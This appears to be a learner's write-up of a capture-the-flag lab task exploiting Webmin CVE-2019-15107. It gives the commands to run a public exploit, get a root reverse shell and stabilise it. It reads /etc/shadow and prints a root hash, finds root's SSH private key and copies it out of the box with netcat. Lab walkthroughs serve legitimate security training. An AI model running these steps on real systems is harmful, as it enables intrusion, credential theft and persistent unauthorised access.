In the previous task we found a vulnerable service[[1]](https://sensorstechforum.com/cve-2019-15107-webmin/)[[2]](https://www.webmin.com/exploit.html) running on the target which will give us the ability to execute commands on the target.

The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for these in an upcoming task!), however, in this instance, an exploit is provided [here](https://github.com/MuirlandOracle/CVE-2019-15107).

---

Start by cloning the repository. This can be done with the following command:

`git clone https://github.com/MuirlandOracle/CVE-2019-15107`  

This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:

`cd CVE-2019-15107 && pip3 install -r requirements.txt`  

If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:  
`sudo apt install python3-pip`  

The script should already be executable, but if not, add the executable bit (`chmod +x ./CVE-2019-15107.py`).

Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).  

Once you're satisfied that the script will do what it says it will, run the exploit against the target!

`./CVE-2019-15107.py TARGET_IP`

![Demonstration of the exploit](https://assets.tryhackme.com/additional/wreath-network/a876ed2dd7ce.png)

---

[1] [https://sensorstechforum.com/cve-2019-15107-webmin/](https://sensorstechforum.com/cve-2019-15107-webmin/)  
[2] [https://www.webmin.com/exploit.html](https://www.webmin.com/exploit.html)  

Answer the questions below

Run the exploit and obtain a pseudoshell on the target!  

1. Which user was the server running as?  

**root**

![[Pasted image 20240719044424.png]]

Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.

Before we do though: nice though this pseudoshell is, it's not a full reverse shell.

Get a reverse shell from the target. You can either do this manually, or by typing `shell` into the pseudoshell and following the instructions given.  

![[Pasted image 20240719044743.png]]

![[Pasted image 20240719044757.png]]


2. **Optional:** Stabilise the reverse shell. There are several techniques for doing this detailed [here](https://tryhackme.com/room/introtoshells).  

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- CTRL+Z

```php
stty raw -echo && fg
```

```php
export TERM=xterm-256-color
```

Now for a little post-exploitation!

3. What is the root user's password hash?  

```php
cat /etc/shadow
```

```php
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
```

Hash:

```php
$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
```

You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.

4. What is the full path to this file?  

```php
find / -name "*id_rsa*" -ls 
```

```php
 13884118      4 -rw-------   1  root     root         2602 Nov  7  2020 /root/.ssh/id_rsa
 13884119      4 -rw-r--r--   1  root     root          748 Jul 18 20:13 /root/.ssh/id_rsa.pub
```

**/root/.ssh/id_rsa**

Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command `chmod 600 KEY_NAME` (substituting in the name of the key) to obtain persistent access to the box.  

Me
```php
nc -lvp 4444 > FILE
```

Target
```php
nc <Target> 4444 -w 3 < FILE
```


We have everything we need for now. Let's move on to the next section: Pivoting!

**Completed:** 2024-07-19

